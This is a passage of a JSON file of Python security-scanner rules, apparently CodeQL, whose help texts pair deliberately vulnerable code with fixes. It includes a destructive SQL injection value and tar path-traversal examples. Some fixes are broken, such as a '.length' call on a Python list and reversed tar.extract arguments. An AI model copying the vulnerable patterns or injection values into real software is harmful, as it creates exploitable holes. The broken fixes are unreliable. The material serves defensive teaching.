    "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine provided by Python uses a backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```python\n\nre.sub(r\"^\\s+|\\s+$\", \"\", text) # BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`^\\s+|(?<!\\s)\\s+$`), or just by using the built-in strip method (`text.strip()`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```python\n\n^0\\.\\d+E?\\d+$ # BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `^0\\.\\d+(E\\d+)?$`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```python\n\nmatch = re.search(r'^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$', str) \n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```python\n\nif len(str) > 1000:\n    raise ValueError(\"Input too long\")\n\nmatch = re.search(r'^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$', str) \n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "py/clear-text-logging-sensitive-data": {
    "name": "Clear-text logging of sensitive information",
    "description": "Logging sensitive information without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/clear-text-logging-sensitive-data",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-359",
      "external/cwe/cwe-532"
    ],
    "filename": "fafb68f4-CleartextLogging",
    "language": "python",
    "help": "# Clear-text logging of sensitive information\nIf sensitive data is written to a log entry it could be exposed to an attacker who gains access to the logs.\n\nPotential attackers can obtain sensitive user data when the log output is displayed. Additionally that data may expose system information such as full path names, system information, and sometimes usernames and passwords.\n\n\n## Recommendation\nSensitive data should not be logged.\n\n\n## Example\nIn the example the entire process environment is logged using \\`print\\`. Regular users of the production deployed application should not have access to this much information about the environment configuration.\n\n\n```python\n# BAD: Logging cleartext sensitive data\nimport os\nprint(f\"[INFO] Environment: {os.environ}\")\n```\nIn the second example the data that is logged is not sensitive.\n\n\n```python\nnot_sensitive_data = {'a': 1, 'b': 2}\n# GOOD: it is fine to log data that is not sensitive\nprint(f\"[INFO] Some object contains: {not_sensitive_data}\")\n```\n\n## References\n* OWASP: [Insertion of Sensitive Information into Log File](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  },
  "py/ip-address-spoofing": {
    "name": "IP address spoofing",
    "description": "A remote endpoint identifier is read from an HTTP header. Attackers can modify the value of the identifier to forge the client ip.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "py/ip-address-spoofing",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-348"
    ],
    "filename": "f2cc87dd-ClientSuppliedIpUsedInSecurityCheck",
    "language": "python",
    "help": "# IP address spoofing\nAn original client IP address is retrieved from an http header (`X-Forwarded-For` or `X-Real-IP` or `Proxy-Client-IP` etc.), which is used to ensure security. Attackers can forge the value of these identifiers to bypass a ban-list, for example.\n\n\n## Recommendation\nDo not trust the values of HTTP headers allegedly identifying the originating IP. If you are aware your application will run behind some reverse proxies then the last entry of a `X-Forwarded-For` header value may be more trustworthy than the rest of it because some reverse proxies append the IP address they observed to the end of any remote-supplied header.\n\n\n## Example\nThe following examples show the bad case and the good case respectively. In `bad1` method and `bad2` method, the client ip the `X-Forwarded-For` is split into comma-separated values, but the less-trustworthy first one is used. Both of these examples could be deceived by providing a forged HTTP header. The method `good1` similarly splits an `X-Forwarded-For` value, but uses the last, more-trustworthy entry.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\"\"\"\n@Desc   \uff1aip address spoofing\n\"\"\"\nfrom flask import Flask\nfrom flask import request\n\napp = Flask(__name__)\n\n@app.route('/bad1')\ndef bad1():\n    client_ip = request.headers.get('x-forwarded-for')\n    if not client_ip.startswith('192.168.'):\n        raise Exception('ip illegal')\n    return 'bad1'\n\n@app.route('/bad2')\ndef bad2():\n    client_ip = request.headers.get('x-forwarded-for')\n    if not client_ip == '127.0.0.1':\n        raise Exception('ip illegal')\n    return 'bad2'\n\n@app.route('/good1')\ndef good1():\n    client_ip = request.headers.get('x-forwarded-for')\n    client_ip = client_ip.split(',')[client_ip.split(',').length - 1]\n    if not client_ip == '127.0.0.1':\n        raise Exception('ip illegal')\n    return 'good1'\n\nif __name__ == '__main__':\n    app.debug = True\n    app.run()\n```\n\n## References\n* Dennis Schneider: [ Prevent IP address spoofing with X-Forwarded-For header when using AWS ELB and Clojure Ring](https://www.dennis-schneider.com/blog/prevent-ip-address-spoofing-with-x-forwarded-for-header-and-aws-elb-in-clojure-ring/)\n* Security Rule Zero: [A Warning about X-Forwarded-For](https://www.f5.com/company/blog/security-rule-zero-a-warning-about-x-forwarded-for)\n* Common Weakness Enumeration: [CWE-348](https://cwe.mitre.org/data/definitions/348.html).\n"
  },
  "py/azure-storage/unsafe-client-side-encryption-in-use": {
    "name": "Unsafe usage of v1 version of Azure Storage client-side encryption.",
    "description": "Using version v1 of Azure Storage client-side encryption is insecure, and may enable an attacker to decrypt encrypted data",
    "kind": "path-problem",
    "tags": [
      "security",
      "experimental",
      "cryptography",
      "external/cwe/cwe-327"
    ],
    "id": "py/azure-storage/unsafe-client-side-encryption-in-use",
    "problem.severity": "error",
    "precision": "medium",
    "filename": "fb05e1be-UnsafeUsageOfClientSideEncryptionVersion",
    "language": "python",
    "help": "# Unsafe usage of v1 version of Azure Storage client-side encryption.\nAzure Storage .NET, Java, and Python SDKs support encryption on the client with a customer-managed key that is maintained in Azure Key Vault or another key store.\n\nCurrent release versions of the Azure Storage SDKs use cipher block chaining (CBC mode) for client-side encryption (referred to as `v1`).\n\n\n## Recommendation\nConsider switching to `v2` client-side encryption.\n\n\n## Example\n\n```python\nblob_client = blob_service_client.get_blob_client(container=container_name, blob=blob_name)\nblob_client.require_encryption = True\nblob_client.key_encryption_key = kek\n# GOOD: Must use `encryption_version` set to `2.0`\nblob_client.encryption_version = '2.0'  # Use Version 2.0!\nwith open(\"decryptedcontentfile.txt\", \"rb\") as stream:\n    blob_client.upload_blob(stream, overwrite=OVERWRITE_EXISTING)\n```\n\n## References\n* [Azure Storage Client Encryption Blog.](http://aka.ms/azstorageclientencryptionblog)\n* [CVE-2022-30187](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30187)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "py/tarslip-extended": {
    "name": "Arbitrary file write during tarfile extraction",
    "description": "Extracting files from a malicious tar archive without validating that the destination file path is within the destination directory can cause files outside the destination directory to be overwritten.",
    "kind": "path-problem",
    "id": "py/tarslip-extended",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-022"
    ],
    "filename": "587e64c0-TarSlipImprov",
    "language": "python"
  },
  "py/tarslip": {
    "name": "Arbitrary file write during tarfile extraction",
    "description": "Extracting files from a malicious tar archive without validating that the destination file path is within the destination directory can cause files outside the destination directory to be overwritten.",
    "kind": "path-problem",
    "id": "py/tarslip",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-022"
    ],
    "filename": "bfd12311-TarSlip",
    "language": "python",
    "help": "# Arbitrary file write during tarfile extraction\nExtracting files from a malicious tar archive without validating that the destination file path is within the destination directory can cause files outside the destination directory to be overwritten, due to the possible presence of directory traversal elements (`..`) in archive paths.\n\nTar archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to determine an output file to write the contents of the archive item to, then the file may be written to an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a tar archive contains a file entry `..\\sneaky-file`, and the tar archive is extracted to the directory `c:\\output`, then naively combining the paths would result in an output file path of `c:\\output\\..\\sneaky-file`, which would cause the file to be written to `c:\\sneaky-file`.\n\n\n## Recommendation\nEnsure that output paths constructed from tar archive entries are validated to prevent writing files to unexpected locations.\n\nThe recommended way of writing an output file from a tar archive entry is to check that `\"..\"` does not occur in the path.\n\n\n## Example\nIn this example an archive is extracted without validating file paths. If `archive.tar` contained relative paths (for instance, if it were created by something like `tar -cf archive.tar ../file.txt`) then executing this code could write to locations outside the destination directory.\n\n\n```python\nimport sys\nimport tarfile\n\nwith tarfile.open(sys.argv[1]) as tar:\n    #BAD : This could write any file on the filesystem.\n    for entry in tar:\n        tar.extract(entry, \"/tmp/unpack/\")\n\n```\nTo fix this vulnerability, we need to check that the path does not contain any `\"..\"` elements in it.\n\n\n```python\nimport sys\nimport tarfile\nimport os.path\n\nwith tarfile.open(sys.argv[1]) as tar:\n    for entry in tar:\n        #GOOD: Check that entry is safe\n        if os.path.isabs(entry.name) or \"..\" in entry.name:\n            raise ValueError(\"Illegal tar archive entry\")\n        tar.extract(entry, \"/tmp/unpack/\")\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Python Library Reference: [TarFile.extract](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extract).\n* Python Library Reference: [TarFile.extractall](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "py/jwt-empty-secret-or-algorithm": {
    "name": "JWT encoding using empty key or algorithm",
    "description": "The application uses an empty secret or algorithm while encoding a JWT Token.",
    "kind": "problem",
    "problem.severity": "warning",
    "id": "py/jwt-empty-secret-or-algorithm",
    "tags": [
      "security",
      "experimental"
    ],
    "filename": "0c0ad72e-JWTEmptyKeyOrAlgorithm",
    "language": "python",
    "help": "# JWT encoding using empty key or algorithm\nApplications encoding a JSON Web Token (JWT) may be vulnerable when the applied key or algorithm is empty or `None`.\n\n\n## Recommendation\nUse non-empty nor `None` values while encoding JWT payloads.\n\n\n## Example\nThis example shows two PyJWT encoding calls. In the first place, the encoding process use a None algorithm whereas the second example uses an empty key. Both examples leave the payload insecurely encoded.\n\n\n```python\nimport jwt\n\n# algorithm set to None\njwt.encode(payload, \"somekey\", None)\n\n# empty key\njwt.encode(payload, key=\"\", algorithm=\"HS256\")\n\n```\n\n## References\n* PyJWT: [Documentation](https://pyjwt.readthedocs.io/en/stable/).\n* Authlib JWT: [Documentation](https://docs.authlib.org/en/latest/specs/rfc7519.html).\n* Python-Jose: [Documentation](https://github.com/mpdavis/python-jose).\n* Auth0 Blog: [Meet the \"None\" Algorithm](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Meet-the--None--Algorithm).\n"
  },
  "py/command-line-injection": {
    "name": "Uncontrolled command line",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "sub-severity": "high",
    "precision": "high",
    "id": "py/command-line-injection",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "3ab15ddb-CommandInjection",
    "language": "python",
    "help": "# Uncontrolled command line\nCode that passes user input directly to `exec`, `eval`, or some other library routine that executes a command, allows the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command to run or the library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows two functions. The first is unsafe as it takes a shell script that can be changed by a user, and passes it straight to `subprocess.call()` without examining it first. The second is safe as it selects the command from a predefined allowlist.\n\n\n```python\n\nurlpatterns = [\n    # Route to command_execution\n    url(r'^command-ex1$', command_execution_unsafe, name='command-execution-unsafe'),\n    url(r'^command-ex2$', command_execution_safe, name='command-execution-safe')\n]\n\nCOMMANDS = {\n    \"list\" :\"ls\",\n    \"stat\" : \"stat\"\n}\n\ndef command_execution_unsafe(request):\n    if request.method == 'POST':\n        action = request.POST.get('action', '')\n        #BAD -- No sanitizing of input\n        subprocess.call([\"application\", action])\n\ndef command_execution_safe(request):\n    if request.method == 'POST':\n        action = request.POST.get('action', '')\n        #GOOD -- Use an allowlist\n        subprocess.call([\"application\", COMMANDS[action]])\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "py/insecure-protocol": {
    "name": "Use of insecure SSL/TLS version",
    "description": "Using an insecure SSL/TLS version may leave the connection vulnerable to attacks.",
    "id": "py/insecure-protocol",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "c6fd54e6-InsecureProtocol",
    "language": "python",
    "help": "# Use of insecure SSL/TLS version\nUsing a broken or weak cryptographic protocol may make a connection vulnerable to interference from an attacker.\n\n\n## Recommendation\nEnsure that a modern, strong protocol is used. All versions of SSL, and TLS versions 1.0 and 1.1 are known to be vulnerable to attacks. Using TLS 1.2 or above is strongly recommended.\n\n\n## Example\nThe following code shows a variety of ways of setting up a connection using SSL or TLS. They are all insecure because of the version specified.\n\n\n```python\nimport ssl\nimport socket\n\n# Using the deprecated ssl.wrap_socket method\nssl.wrap_socket(socket.socket(), ssl_version=ssl.PROTOCOL_SSLv2)\n\n# Using SSLContext\ncontext = ssl.SSLContext(ssl_version=ssl.PROTOCOL_SSLv3)\n\n# Using pyOpenSSL\n\nfrom pyOpenSSL import SSL\n\ncontext = SSL.Context(SSL.TLSv1_METHOD)\n\n\n\n```\nAll cases should be updated to use a secure protocol, such as `PROTOCOL_TLSv1_2`.\n\nNote that `ssl.wrap_socket` has been deprecated in Python 3.7. The recommended alternatives are:\n\n* `ssl.SSLContext` - supported in Python 2.7.9, 3.2, and later versions\n* `ssl.create_default_context` - a convenience function, supported in Python 3.4 and later versions.\nEven when you use these alternatives, you should ensure that a safe protocol is used. The following code illustrates how to use flags (available since Python 3.2) or the \\`minimum_version\\` field (favored since Python 3.7) to restrict the protocols accepted when creating a connection.\n\n\n```python\nimport ssl\n\n# Using flags to restrict the protocol\ncontext = ssl.SSLContext()\ncontext.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1\n\n# Declaring a minimum version to restrict the protocol\ncontext = ssl.create_default_context()\ncontext.minimum_version = ssl.TLSVersion.TLSv1_2\n\n```\n\n## References\n* Wikipedia: [ Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security).\n* Python 3 documentation: [ class ssl.SSLContext](https://docs.python.org/3/library/ssl.html#ssl.SSLContext).\n* Python 3 documentation: [ ssl.wrap_socket](https://docs.python.org/3/library/ssl.html#ssl.wrap_socket).\n* Python 3 documentation: [ notes on context creation](https://docs.python.org/3/library/ssl.html#functions-constants-and-exceptions).\n* Python 3 documentation: [ notes on security considerations](https://docs.python.org/3/library/ssl.html#ssl-security).\n* pyOpenSSL documentation: [ An interface to the SSL-specific parts of OpenSSL](https://pyopenssl.org/en/stable/api/ssl.html).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "py/sql-injection": {
    "name": "SQL query built from user-controlled sources",
    "description": "Building a SQL query from user-controlled sources is vulnerable to insertion of malicious SQL code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "py/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "f45c3b61-SqlInjection",
    "language": "python",
    "help": "# SQL query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a user may be able to run malicious database queries.\n\nThis also includes using the `TextClause` class in the `[SQLAlchemy](https://pypi.org/project/SQLAlchemy/)` PyPI package, which is used to represent a literal SQL fragment and is inserted directly into the final SQL when used in a query built using the ORM.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\n\n## Example\nIn the following snippet, a user is fetched from the database using three different queries.\n\nIn the first case, the query string is built by directly using string formatting from a user-supplied request parameter. The parameter may include quote characters, so this code is vulnerable to a SQL injection attack.\n\nIn the second case, the user-supplied request attribute is passed to the database using query parameters. The database connector library will take care of escaping and inserting quotes as needed.\n\nIn the third case, the placeholder in the SQL string has been manually quoted. Since most databaseconnector libraries will insert their own quotes, doing so yourself will make the code vulnerable to SQL injection attacks. In this example, if `username` was `; DROP ALL TABLES -- `, the final SQL query would be `SELECT * FROM users WHERE username = ''; DROP ALL TABLES -- ''`\n\n\n```python\nfrom django.conf.urls import url\nfrom django.db import connection\n\n\ndef show_user(request, username):\n    with connection.cursor() as cursor:\n        # BAD -- Using string formatting\n        cursor.execute(\"SELECT * FROM users WHERE username = '%s'\" % username)\n        user = cursor.fetchone()\n\n        # GOOD -- Using parameters\n        cursor.execute(\"SELECT * FROM users WHERE username = %s\", username)\n        user = cursor.fetchone()\n\n        # BAD -- Manually quoting placeholder (%s)\n        cursor.execute(\"SELECT * FROM users WHERE username = '%s'\", username)\n        user = cursor.fetchone()\n\nurlpatterns = [url(r'^users/(?P<username>[^/]+)$', show_user)]\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* OWASP: [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n* [SQLAlchemy documentation for TextClause](https://docs.sqlalchemy.org/en/14/core/sqlelement.html#sqlalchemy.sql.expression.text.params.text).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "py/reflective-xss": {
    "name": "Reflected server-side cross-site scripting",
    "description": "Writing user input directly to a web page allows for a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "sub-severity": "high",
    "precision": "high",
    "id": "py/reflective-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "3e123dc1-ReflectedXss",
    "language": "python",
    "help": "# Reflected server-side cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider escaping the input before writing user input to the page. The standard library provides escaping functions: `html.escape()` for Python 3.2 upwards or `cgi.escape()` older versions of Python. Most frameworks also provide their own escaping functions, for example `flask.escape()`.\n\n\n## Example\nThe following example is a minimal flask app which shows a safe and unsafe way to render the given name back to the page. The first view is unsafe as `first_name` is not escaped, leaving the page vulnerable to cross-site scripting attacks. The second view is safe as `first_name` is escaped, so it is not vulnerable to cross-site scripting attacks.\n\n\n```python\nfrom flask import Flask, request, make_response, escape\n\napp = Flask(__name__)\n\n@app.route('/unsafe')\ndef unsafe():\n    first_name = request.args.get('name', '')\n    return make_response(\"Your name is \" + first_name)\n\n@app.route('/safe')\ndef safe():\n    first_name = request.args.get('name', '')\n    return make_response(\"Your name is \" + escape(first_name))\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "py/request-without-cert-validation": {
    "name": "Request without certificate validation",
    "description": "Making a request without certificate validation can allow man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "py/request-without-cert-validation",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "35f1c149-RequestWithoutValidation",
    "language": "python",
    "help": "# Request without certificate validation\nEncryption is key to the security of most, if not all, online communication. Using Transport Layer Security (TLS) can ensure that communication cannot be interrupted by an interloper. For this reason, it is unwise to disable the verification that TLS provides. Functions in the `requests` module provide verification by default, and it is only when explicitly turned off using `verify=False` that no verification occurs.\n\n\n## Recommendation\nNever use `verify=False` when making a request.\n\n\n## Example\nThe example shows two unsafe calls to [semmle.com](https://semmle.com), followed by various safe alternatives.\n\n\n```python\nimport requests\n\n#Unsafe requests\n\nrequests.get('https://semmle.com', verify=False) # UNSAFE\nrequests.get('https://semmle.com', verify=0) # UNSAFE\n\n#Various safe options\n\nrequests.get('https://semmle.com', verify=True) # Explicitly safe\nrequests.get('https://semmle.com', verify=\"/path/to/cert/\")\nrequests.get('https://semmle.com') # The default is to verify.\n\n#Wrapper to ensure safety\n\ndef make_safe_request(url, verify_cert):\n    if not verify_cert:\n        raise Exception(\"Trying to make unsafe request\")\n    return requests.get(url, verify_cert)\n\n```\n\n## References\n* Python requests documentation: [SSL Cert Verification](https://requests.readthedocs.io/en/latest/user/advanced/#ssl-cert-verification).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "py/unsafe-unpacking": {
    "name": "Arbitrary file write during a tarball extraction from a user controlled source",
    "description": "Extracting files from a potentially malicious tarball using `shutil.unpack_archive()` without validating that the destination file path is within the destination directory can cause files outside the destination directory to be overwritten. More precisely, if the tarball comes from a user controlled location either a remote one or cli argument.",
    "kind": "path-problem",
    "id": "py/unsafe-unpacking",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "medium",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-022"
    ],
    "filename": "587e64c0-UnsafeUnpack",
    "language": "python",
    "help": "# Arbitrary file write during a tarball extraction from a user controlled source\nExtracting files from a malicious tarball without validating that the destination file path is within the destination directory using `shutil.unpack_archive()` can cause files outside the destination directory to be overwritten, due to the possible presence of directory traversal elements (`..`) in archive path names.\n\nTarball contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to determine an output file to write the contents of the archive item to, then the file may be written to an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nFor example, if a tarball contains a file entry `../sneaky-file.txt`, and the tarball is extracted to the directory `/tmp/tmp123`, then naively combining the paths would result in an output file path of `/tmp/tmp123/../sneaky-file.txt`, which would cause the file to be written to `/tmp/`.\n\n\n## Recommendation\nEnsure that output paths constructed from tarball entries are validated to prevent writing files to unexpected locations.\n\nConsider using a safer module, such as: `zipfile`\n\n\n## Example\nIn this example an archive is extracted without validating file paths.\n\n\n```python\nimport requests\nimport shutil\n\nurl = \"https://www.someremote.location/tarball.tar.gz\"\nresponse = requests.get(url, stream=True)\n\ntarpath = \"/tmp/tmp456/tarball.tar.gz\"\nwith open(tarpath, \"wb\") as f:\n      f.write(response.raw.read())\n\nuntarredpath = \"/tmp/tmp123\"\nshutil.unpack_archive(tarpath, untarredpath)\n```\nTo fix this vulnerability, we need to call the function `tarfile.extract()` on each `member` after verifying that it does not contain either `..` or startswith `/`.\n\n\n```python\nimport requests\nimport tarfile\n\nurl = \"https://www.someremote.location/tarball.tar.gz\"\nresponse = requests.get(url, stream=True)\n\ntarpath = \"/tmp/tmp456/tarball.tar.gz\"\nwith open(tarpath, \"wb\") as f:\n      f.write(response.raw.read())\n\nuntarredpath = \"/tmp/tmp123\"\nwith tarfile.open(tarpath) as tar:\n\tfor member in tar.getmembers():\n\t\tif member.name.startswith(\"/\") or \"..\" in member.name:\n\t\t\traise Exception(\"Path traversal identified in tarball\")\n\n\t\ttar.extract(untarredpath, member)\n```\n\n## References\n* Shutil official documentation [shutil.unpack_archive() warning.](https://docs.python.org/3/library/shutil.html?highlight=unpack_archive#shutil.unpack_archive)\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "py/template-injection": {
    "name": "Server Side Template Injection",
    "description": "Using user-controlled data to create a template can cause security issues.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "py/template-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-074"
    ],
    "filename": "edc0c128-TemplateInjection",
    "language": "python",
    "help": "# Server Side Template Injection\nTemplate Injection occurs when user input is embedded in a template in an unsafe manner. When an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side is results in Server Side Template Injection.\n\n\n## Recommendation\nTo fix this, ensure that an untrusted value is not used as a template. If the application requirements do not alow this, use a sandboxed environment where access to unsafe attributes and methods is prohibited.\n\n\n## Example\nConsider the example given below, an untrusted HTTP parameter \\`template\\` is used to generate a Jinja2 template string. This can lead to remote code execution.\n\n\n```python\nfrom django.urls import path\nfrom django.http import HttpResponse\nfrom jinja2 import Template as Jinja2_Template\nfrom jinja2 import Environment, DictLoader, escape\n\n\ndef a(request):\n    # Load the template\n    template = request.GET['template']\n    t = Jinja2_Template(template)\n    name = request.GET['name']\n    # Render the template with the context data\n    html = t.render(name=escape(name))\n    return HttpResponse(html)\n\n\nurlpatterns = [\n    path('a', a),\n]\n\n```\nHere we have fixed the problem by using the Jinja sandbox environment for evaluating untrusted code.\n\n\n```python\nfrom django.urls import path\nfrom django.http import HttpResponse\nfrom jinja2 import Template as Jinja2_Template\nfrom jinja2 import Environment, DictLoader, escape\n\n\ndef a(request):\n    # Load the template\n    template = request.GET['template']\n    env = SandboxedEnvironment(undefined=StrictUndefined)\n    t = env.from_string(template)\n    name = request.GET['name']\n    # Render the template with the context data\n    html = t.render(name=escape(name))\n    return HttpResponse(html)\n\n\nurlpatterns = [\n    path('a', a),\n]\n\n```\n\n## References\n* Portswigger : \\[Server Side Template Injection\\](https://portswigger.net/web-security/server-side-template-injection)\n* Common Weakness Enumeration: [CWE-74](https://cwe.mitre.org/data/definitions/74.html).\n"
  },
  "py/flask-debug": {
    "name": "Flask app is run in debug mode",
    "description": "Running a Flask app in debug mode may allow an attacker to run arbitrary code through the Werkzeug debugger.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/flask-debug",
    "tags": [
      "security",
      "external/cwe/cwe-215",
      "external/cwe/cwe-489"
    ],
